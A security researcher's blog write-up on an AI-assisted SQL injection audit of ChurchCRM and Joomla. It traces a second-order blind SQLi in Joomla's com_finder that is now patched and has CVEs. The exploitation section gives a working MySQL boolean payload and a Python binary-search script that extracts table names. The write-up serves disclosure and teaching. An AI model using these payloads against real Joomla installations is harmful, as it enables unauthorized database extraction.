---
description: How a manual SQLi hunt turned into an AI-assisted Joomla audit and two assigned CVEs.
categories:
    - PHP
    - SQLI
    - Joomla
    - AI-Assisted Auditing
published: "2026-06-13"
---

# 1. A Random PHP Detour<a id="a-random-php-detour"></a>

This whole journey started by me randomly finding a **CRM** repository written in **PHP** for managing churches called [ChurchCRM](https://github.com/ChurchCRM/CRM). It had an interesting [advisory history](https://github.com/ChurchCRM/CRM/security/advisories) already: several **SQL injections**, **XSS** issues, and other typical web application bugs. Having a closer look at the **SQL injection** advisories, the bugs looked to me very simple including some text book **SQL injections**. So I became curious whether there are more **SQL** related issues present in this repository and started having a look how this application talks to the database. In [ChurchCRM](https://github.com/ChurchCRM/CRM) this turned out quite easy. A lot of legacy code constructs **SQL** strings manually and then passes them into the `RunQuery` function, a function that delegates the query execution to the underlying database. That gives you a very direct source-to-sink search strategy. You just need to search for `RunQuery`, inspect the **SQL** construction directly above it, and then trace the variables backwards. One representative example for this is the vulnerable [ChurchCRM 7.0.5 `SettingsUser.php`](https://github.com/ChurchCRM/CRM/blob/7.0.5/src/SettingsUser.php#L14-L47):

```php
if (isset($_POST['save'])) {
    $new_value = $_POST['new_value'];
    $new_permission = $_POST['new_permission'];
    $type = $_POST['type'];
    ksort($type);
    reset($type);
    while ($current_type = current($type)) {
        $id = key($type);

        // ...

        $sSQL = 'UPDATE userconfig_ucfg '
            . "SET ucfg_value='$value', ucfg_permission='$permission' "
            . "WHERE ucfg_id='$id' AND ucfg_per_id='0' ";
        $rsUpdate = RunQuery($sSQL);
        next($type);
    }
}
```

It's quite easy to see that this implementation is vulnerable to **SQL injection** due to the missing sanitization of `$_POST['type']` and thus also `$id` which is directly placed into the `WHERE` clause. This became [CVE-2026-39325](https://github.com/ChurchCRM/CRM/security/advisories/GHSA-cf68-g7vf-9xrq) among several other **SQL injections** I reported.

In this repository the common theme was not just some missing sanitizer. The bigger issue was architectural. There were raw **SQL** strings everywhere, partial filtering, custom sanitizer helpers used inconsistently, wrong assumptions about request shapes, and almost no usage of prepared statements.

After reporting everything I found to [ChurchCRM](https://github.com/ChurchCRM/CRM), I wanted to know whether the same workflow would still work on a more popular, larger and better reviewed codebase. At first I found another interesting looking **CRM** called [SuiteCRM](https://github.com/SuiteCRM/SuiteCRM), and after reporting a bunch of **SQL injections** there, which have not been resolved yet, I went over to [Joomla](https://github.com/joomla/joomla-cms) which is a **CMS** like [WordPress](https://wordpress.com/) but not as popular. But still [Joomla](https://github.com/joomla/joomla-cms) has more than **5k** GitHub stars and a large amount of legacy **PHP** code. When counting only the Joomla source directories, the tagged [Joomla 5.4.5](https://github.com/joomla/joomla-cms/tree/5.4.5) tree contains about **250k PHP** code lines.

# 2. Turning Manual Review Into An AI Workflow<a id="turning-manual-review-into-an-ai-workflow"></a>

At this point the [ChurchCRM](https://github.com/ChurchCRM/CRM) process felt mechanical enough that I wanted to automate parts of it with an AI agent. I was using **Codex 5.3** at the time. For this kind of security research you have to go through the verification flow at [chatgpt.com/cyber](https://chatgpt.com/cyber). In my case that was straightforward: explain what you want to do, provide some information about yourself, and link something like your LinkedIn profile or personal website.

## 2.1. How Joomla Interacts With The Database<a id="how-joomla-interacts-with-the-database"></a>

The way [Joomla](https://github.com/joomla/joomla-cms) implements database interaction is by using a database abstraction layer, a query builder, and table/model classes. So by instructing an agent to search for specific function calls, it was possible to discover potentially vulnerable **SQL** sinks:

- `getQuery` finds the query-builder construction. This is where **SQL** structure usually starts being assembled, as in [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L154-L158):

```php
$db    = $this->getDatabase();
$query = $db->getQuery(true);
```

- `setQuery` finds the handoff to the database driver. There might be cases where the query was built somewhere else and executed later, for example in [BaseDatabaseModel::_getList()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/MVC/Model/BaseDatabaseModel.php#L161-L164):

```php
$this->getDatabase()->setQuery($query);
return $this->getDatabase()->loadObjectList();
```

- `getDatabase` finds the modern database access. It shows where a class obtains the database handle before building or executing queries, for example in the finder content plugin's [getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L379-L385):

```php
$db = $this->getDatabase();
$query = $query instanceof QueryInterface ? $query : $db->getQuery(true);
```

- `Factory::getDbo` finds older legacy database access. It is deprecated in [Joomla 5.4.5](https://github.com/joomla/joomla-cms/tree/5.4.5), but still appears in helper functions, for example [CMSHelper::getLanguageId()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/Helper/CMSHelper.php#L80-L89):

```php
$db    = Factory::getDbo();
$query = $db->getQuery(true);
$db->setQuery($query);
```

However these searches overlap heavily. Searching all of them produces duplicate sinks. So the next logical step was to have the agent remove duplicates and then reduce the candidate list further.

## 2.2. Removing Safe Sinks<a id="removing-obvious-safe-sinks"></a>

After removing duplicates, the broad search still had a lot of sinks that are not worth deeper analysis. I defined a dynamic input as any **SQL** fragment using a variable, concatenation, or interpolation. From there, the agent had to keep only query candidates where any of the used parameters is derived dynamically. The agent also had to check how the query uses prepared statements. [Joomla](https://github.com/joomla/joomla-cms) commonly represents dynamic values with SQL parameter placeholders like `:id`, `:username`, or `?`, and then binds the real **PHP** value separately, for example in [UserGroupsHelper::getTitle()](https://github.com/joomla/joomla-cms/blob/5.4.5/libraries/src/Helper/UserGroupsHelper.php#L229-L233):

```php
$query = $db->getQuery(true)
    ->select('*')
    ->from($db->quoteName('#__usergroups'))
    ->where($db->quoteName('id') . ' = :id')
    ->bind(':id', $id, ParameterType::INTEGER);
```

Even if `$id` came from an attacker, it is not copied into the **SQL** text as syntax. A correctly bound value placeholder protects that specific value from becoming **SQL** grammar. However, that only proves safety for the value represented by the placeholder. The whole query can still be unsafe if another attacker-controlled value is concatenated into **SQL** structure, for example an `ORDER BY` column, a sort direction, a table name, a column name, a raw `LIMIT` fragment, or a manually built `IN (...)` list.

The important filtering rules were:
- Remove fully static queries, because a hardcoded query with no dynamic fragment cannot be influenced by an attacker
- Remove a dynamic query only when every attacker-controlled input is used as a bound **SQL** value, for example through a placeholder and `$query->bind()`. If attacker-controlled data can influence **SQL** structure such as table names, column names, aliases, `ORDER BY`, sort direction, `GROUP BY`, `HAVING`, unbound `LIMIT` or `OFFSET` fragments, manually built `WHERE ... IN (...)` lists, or raw expression fragments, the query has to stay in the candidate list.

The important output of this phase was `sinks.json`, which kept the unique dynamic candidates in **JSON** format containing different information like the file name and line number where the used keyword was found, which variables are dynamic and more:

```json
{
    "file": "components/com_finder/src/Model/SearchModel.php",
    "class": "SearchModel",
    "function": "getListQuery",
    "line": 158,
    "full_query_logics": [
        "<line-number>: <code>",
    ],
    "dynamic_inputs": [
        "$groups",
        "$this->searchquery->filters",
        "$group",
        "$taxonomies",
        "$ordering",
        "$direction"
    ]
}
```

After removing static queries, duplicates, and queries where all dynamic values were safely bound, **247** entries remained in `sinks.json`.

## 2.3. Deep Inspection Of The Remaining Sinks<a id="deep-inspection-of-the-remaining-sinks"></a>

After these filtering steps, the remaining candidates are all potentially vulnerable sinks worth some deeper analysis. The next step was to automate the focused analysis by giving an agent one candidate at a time.

In short the instructions I gave to the agents were basically the following:
- Prove external reachability before calling anything a vulnerability e.g. via the UI with any privileges, API, etc
- Identify the concrete source, propagation path, route, sink, and SQL context
- Inspect transformations such as trimming, escaping, encoding, decoding, type coercion, and query-builder behavior
- Treat stored values as untrusted until the writer path, persistence behavior, and later reader path were understood

I also gave the agent the opportunity to test against a locally running [Joomla](https://github.com/joomla/joomla-cms) Docker environment. After iterating over all the candidates, which actually took a couple of days, **Codex** found several interesting issues. I thoroughly analyzed the results of every claimed vulnerability and two of them caught my attention. After a comprehensive review of these bugs, improving the POCs and writing a detailed report, I sent every necessary information of these two vulnerabilities to the [Joomla! Security Strike Team](https://developer.joomla.org/security.html), and both reports resulted in a CVE:
- [CVE-2026-35221](https://developer.joomla.org/security-centre/1038-20260506-core-authenticated-blind-sqli-in-com-finder.html), authenticated blind SQLi in `com_finder`.
- [CVE-2026-35222](https://developer.joomla.org/security-centre/1039-20260507-core-authenticated-blind-sqli-in-com-tags.html), authenticated blind SQLi in `com_tags`.

Both are second-order **SQL injections**. Below I focus on the one in `com_finder`.

# 3. The Vulnerability In com_finder<a id="the-vulnerability"></a>

Some [Joomla](https://github.com/joomla/joomla-cms) terminology is worth explaining before going into the source-to-sink trace:
- A **component** is the main application unit behind a request. In e.g. `index.php?option=com_finder&view=search`, `option=com_finder` selects the **Smart Search** component and `view=search` selects the search view/model
- **Finder** is [Joomla](https://github.com/joomla/joomla-cms)'s **Smart Search** system. It builds its own search index instead of querying articles directly for every search request

The short version of the bug is:
- An authenticated content user stores text as the title of a **Finder** taxonomy node.
- A later public **Finder** search loads that stored title by prefix.
- Joomla accidentally stores the title as an array key.
- `SearchModel::getListQuery` later treats that key as a numeric taxonomy id and concatenates it into `IN (...)` without any sanitization.

## 3.1. Storing The Payload<a id="storing-the-payload"></a>

The whole exploitation process starts with the article `created_by_alias` field which is the **Created by Alias** metadata field for articles. It lets an author display another author's name instead of the account name. A user with enough content permissions, for example the **Publisher** role with `core.create` and `core.edit.state` privileges, can create a published article and set this field. If the user cannot publish directly, the value can still become a second-order payload, but it needs another workflow step where someone publishes or indexes the content.

![Publisher article form with the SQLi payload in Created by Alias](blog/posts/joomla-sqli/publisher-created-by-alias-browser.png "Publisher Created by Alias payload")

When saving an article, [ArticleModel::save()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_content/src/Model/ArticleModel.php#L657-L668) only applies `TRIM` to `created_by_alias` which is in our case `13371337*0+IF((1=1),t.node_id,0)`:

```php
if (isset($data['created_by_alias'])) {
    $data['created_by_alias'] = $filter->clean($data['created_by_alias'], 'TRIM');
}
```

So after saving the article, the attacker-controlled value is still the same value, except for leading and trailing whitespace. [Joomla](https://github.com/joomla/joomla-cms)'s content event plugin starts **Finder** indexing through [onContentAfterSave()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/content/finder/src/Extension/Finder.php#L72-L81). That handler imports the `finder` plugin group and dispatches `onFinderAfterSave`. The Finder content plugin receives that event, calls `reindex($row->id)`, and the inherited adapter logic eventually calls this plugin's `getListQuery()` to reload the saved article for indexing.

The query explicitly selects `a.created_by_alias` in [Content::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L384-L388):

```php
->select('a.created_by_alias, a.modified, a.modified_by, a.attribs AS params')
```

In the following step, the **Finder** content plugin turns article metadata into **Smart Search** taxonomy metadata. In [plugins/finder/content/src/Extension/Content.php](https://github.com/joomla/joomla-cms/blob/5.4.5/plugins/finder/content/src/Extension/Content.php#L339-L342), it adds an `Author` taxonomy node like this:

```php
if (\in_array('author', $taxonomies) && (!empty($item->author) || !empty($item->created_by_alias))) {
    $item->addTaxonomy('Author', !empty($item->created_by_alias) ? $item->created_by_alias : $item->author, $item->state);
}
```

`Author` is the taxonomy branch. The second argument is the taxonomy title. `Result::addTaxonomy` then receives these arguments as `$branch` and `$title` in [Result.php](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Result.php#L395-L414):

```php
public function addTaxonomy($branch, $title, $state = 1, $access = 1, $language = '*')
{
    // ...
    $node           = new \stdClass();
    $node->title    = $title;
    // ...
    $this->taxonomy[$branch][] = $node;
}
```

Later, [Taxonomy::storeNode()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Taxonomy.php#L205-L210) copies that title into the Finder taxonomy table row:

```php
$nodeTable->title    = $node->title;
$nodeTable->access   = (int) $node->access;
$nodeTable->language = $node->language;
```

So the write-side path is:

1. The article form stores the payload in `$data['created_by_alias']`.
2. **Finder** reloads the saved article and exposes the same value as `$item->created_by_alias`.
3. The content plugin passes it into `addTaxonomy('Author', $item->created_by_alias, ...)`.
4. Inside `Result::addTaxonomy`, this second argument becomes the `$node->title`.
5. `Taxonomy::storeNode` copies `$node->title` into `$nodeTable->title`.
6. The table object persists it as `#__finder_taxonomy.title`.

At this point the attacker-controlled value is persistent in the database.

## 3.2. Loading The Stored Title<a id="loading-the-stored-title"></a>

The trigger is a frontend **Finder** search request. The `q` parameter is the **Smart Search** query string, and `author:<prefix>` is **Finder's** modifier syntax for filtering by the `Author` taxonomy branch:

```text
GET /index.php?option=com_finder&view=search&q=<article-title>+author:<prefix>
```

[SearchModel.php::populateState()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L472-L511) reads `q` with `getString()` and creates a **Finder** query object:

```php
$options['input'] = $input->getString('q', $params->get('q', ''));
$this->searchquery = new Query($options, $this->getDatabase());
```

Inside [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L734-L764), Joomla builds modifier patterns from the Finder taxonomy branch titles:

```php
foreach (Taxonomy::getBranchTitles() as $branch) {
    $patterns[$branch] = StringHelper::strtolower(Text::_(LanguageHelper::branchSingular($branch)));
}
```

On a normal English install, the `Author` branch therefore matches the search modifier `author:<value>`. After the regex match in [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L793-L843), the relevant variables are set as `$modifier = 'Author'` and `$value = '13371337'`. [Joomla](https://github.com/joomla/joomla-cms) then loads the taxonomy node by prefix:

```php
$return = Taxonomy::getNodeByTitle($modifier, $value);
```

[Taxonomy::getNodeByTitle()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Taxonomy.php#L345-L368) searches the `Author` branch and matches the stored title with `LIKE '<prefix>%'`:

```php
public static function getNodeByTitle($branch, $title)
{
// ...
->where('t1.title LIKE ' . $db->quote($db->escape($title) . '%'))
->where('t2.title = ' . $db->quote($branch));
// ...
}
```

The lookup itself safely quotes and escapes the prefix in a `LIKE` query to make sure it is not possible to escape out of the string context, and returns the matching row.

## 3.3. The Key/Value Mix-up<a id="the-key-value-mix-up"></a>

The vulnerable code is directly afterwards, in [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L829-L843):

```php
if ($return) {
    // ...
    $this->filters[$modifier][$return->title] = (int) $return->id;
}
```

The key becomes the malicious stored taxonomy **title**, and the value becomes the integer taxonomy **id**. But the later query-building code expects the opposite data shape with the numeric taxonomy ids as array keys. Static filters in the same class already use that shape, for example in [Query.php::processStaticTaxonomy()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L568-L570).

## 3.4. The Sink<a id="the-sink"></a>

The sink is in [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L192-L203):

```php
if (!empty($this->searchquery->filters)) {
    $groups     = array_values($this->searchquery->filters);
    $taxonomies = array_merge(...array_map(fn ($group) => array_keys($group), $groups));

    $query->join('INNER', $db->quoteName('#__finder_taxonomy_map') . ' AS t ON t.link_id = l.link_id')
        ->where('t.node_id IN (' . implode(',', array_unique($taxonomies)) . ')');

    foreach ($groups as $group) {
        $query->having('SUM(CASE WHEN t.node_id IN (' . implode(',', array_keys($group)) . ') THEN 1 ELSE 0 END) > 0');
    }
}
```

At this point the relevant object state looks like this, where `123` is an example Finder taxonomy node id:

```php
$this->searchquery->filters = [
    'Author' => [
        '13371337*0+IF((1=1),t.node_id,0)' => 123,
    ],
];
```

Later in `array_keys($group)` [Joomla](https://github.com/joomla/joomla-cms) expects the array key to be the numeric taxonomy id, but because of the earlier assignment the key is the malicious stored taxonomy title. The `implode()` just turns the payload into raw **SQL** as it is just inserted in the expression context. So the generated query contains a fragment like this:

```sql
SUM(CASE WHEN t.node_id IN (13371337*0+IF((1=1),t.node_id,0)) THEN 1 ELSE 0 END) > 0
```

# 4. Exploitation<a id="exploitation"></a>

The payload `13371337*0+IF((1=1),t.node_id,0)` was created to work exactly in this numeric expression context. The individual parts are:
- `13371337` is just a random numeric marker. The public search later uses e.g. `author:13371337`, and the prefix lookup loads the full stored taxonomy title with `LIKE '13371337%'`
- `*0` makes the marker contribute `0` to the expression. This lets the payload start with the searchable numeric prefix without changing the result of the following `IF(...)` expression
- `IF((1=1),t.node_id,0)` is a **MySQL** conditional expression. For real extraction, the `1=1` test is replaced with a valid boolean condition, for example `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1)) >= 109`. This reads the first character of the first table name in the current database, converts it to its ASCII number, and checks whether that number is at least `109` which corresponds to the ASCII character `m`.
- `t.node_id` comes from [Joomla](https://github.com/joomla/joomla-cms)'s own query. Because the payload is wrapped with `t.node_id IN (...)`, it returns either the current `t.node_id` or `0` depending on the condition.

This turns the search result page into a boolean oracle. To dump parts of the database you can just reuse the same shape and replace `<condition>` in each iteration.

Triggering a `True` condition by creating an article with alias `13371337*0+IF((1=1),t.node_id,0)` will look like:

![Finder search returning results for the true SQL condition](blog/posts/joomla-sqli/finder-search-true-browser.png "Finder true condition")

The `False` condition just returns nothing via the search filter after creating an article with alias `73317331*0+IF((1=0),t.node_id,0)`:

![Finder search returning no results for the false SQL condition](blog/posts/joomla-sqli/finder-search-false-browser.png "Finder false condition")

The very simplified extraction script to dump the database table names looks like this. `search_term` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter:

```python
def cond(table_offset, pos, mid):
    return (
        "ASCII(SUBSTRING((SELECT table_name "
        "FROM information_schema.tables "
        "WHERE table_schema=DATABASE() "
        f"ORDER BY table_name LIMIT 1 OFFSET {table_offset}),{pos},1))>={mid}"
    )

for pos in range(1, 65):
    lo, hi = 0, 127
    search_term = "1337"

    while lo < hi:
        mid = (lo + hi + 1) // 2
        alias_payload = f"{prefix}*0+IF(({cond(0, pos, mid)}),t.node_id,0)"

        save_article_created_by_alias(alias_payload)
        ok = finder_search_returns_results(f"{search_term} author:{prefix}")

        if ok:
            lo = mid
        else:
            hi = mid - 1
```

This is basically a binary search to extract table names character by character through the boolean oracle.

# 5. The Fix<a id="the-fix"></a>

The vulnerability is a typical second-order bug, although it also relies on a logical bug and a broken contract between [Query::processString()](https://github.com/joomla/joomla-cms/blob/5.4.5/administrator/components/com_finder/src/Indexer/Query.php#L843) and [SearchModel::getListQuery()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L193-L194). The stored value is safe enough for one query, returned as data, placed into the wrong side of an array, and later interpreted as **SQL**. The main issue is the data shape between those steps. `Query::processString` creates `title => id`, while `SearchModel::getListQuery` expects `id => title`.

The [Joomla](https://github.com/joomla/joomla-cms) fix in 5.4.6 is small and targets the key/value bug directly. In [Query.php on tag 5.4.6](https://github.com/joomla/joomla-cms/blob/5.4.6/administrator/components/com_finder/src/Indexer/Query.php#L842-L843), the filter map is changed to store the integer id as the key and the taxonomy title as the value:

Before:

```php
$this->filters[$modifier][$return->title] = (int) $return->id;
```

After:

```php
$this->filters[$modifier][(int) $return->id] = $return->title;
```

# 6. Final Thoughts<a id="final-thoughts"></a>

Before falling into this rabbit hole, I did not really expect **SQL injections** to still be this common in large applications. But it makes sense. Many old codebases were written before prepared statements became the default habit everywhere. Later, they grew their own sanitizer functions, query builders, table abstractions, and framework conventions. Rewriting all of that is expensive, and the dangerous parts are often exactly in the compatibility layer between old and new patterns.

Prepared statements also cannot solve everything for a framework like [Joomla](https://github.com/joomla/joomla-cms). They are the right tool for values, but not for every dynamic SQL fragment. Sort orders, column names, table names, aliases, and raw expressions still need strict whitelisting, hardcoded mappings, type normalization, or other structural controls.

The workflow with AI also worked surprisingly well when splitting the task into reviewable units:

- enumerate concrete sinks
- remove clearly safe ones
- give the agent one sink at a time
- force source-to-sink tracing
- require runtime proof
- manually verify the result before reporting

This kind of workflow should be applicable to every vulnerability type. But I think it works especially well for **SQL injection**, because the potentially vulnerable sinks are quite easy to find using simple keywords, as explained in [section 2.1](#how-joomla-interacts-with-the-database). My guess is that vulnerabilities like **XSS** are harder to find with this workflow, because there are many different ways to execute **JavaScript**. On top of that, JavaScript code often has many different places where user-controlled input could end up being executed in another user's browser.

# 7. Disclosure Timeline<a id="disclosure-timeline"></a>

The [Joomla advisory](https://developer.joomla.org/security-centre/1038-20260506-core-authenticated-blind-sqli-in-com-finder.html) classifies the `com_finder` issue with **Impact: High**, **Severity: Moderate**, **Probability: Moderate**, and **Exploit type: SQLi**. Joomla uses its own advisory fields here and does not publish a **CVSS** score or vector for this entry. I read the rating as: the impact is high because blind **SQL injection** can expose database contents, but the practical severity and probability are lower because exploitation needs an authenticated content user, a stored second-order payload, Finder indexing, and blind extraction through search-result differences.

The disclosure timeline for the two Joomla **SQL injection** reports looked like this:
- **2026-03-31:** Reported the `com_finder` and `com_tags` issues to the Joomla Security Strike Team.
- **2026-04-01:** First acknowledgment.
- **2026-04-11:** Confirmation of the issues and initial patch development.
- **2026-05-26:** Fixed in Joomla CMS **5.4.6** and **6.1.1** and [CVE-2026-35221](https://www.cve.org/CVERecord?id=CVE-2026-35221) and [CVE-2026-35222](https://www.cve.org/CVERecord?id=CVE-2026-35222) assigned.
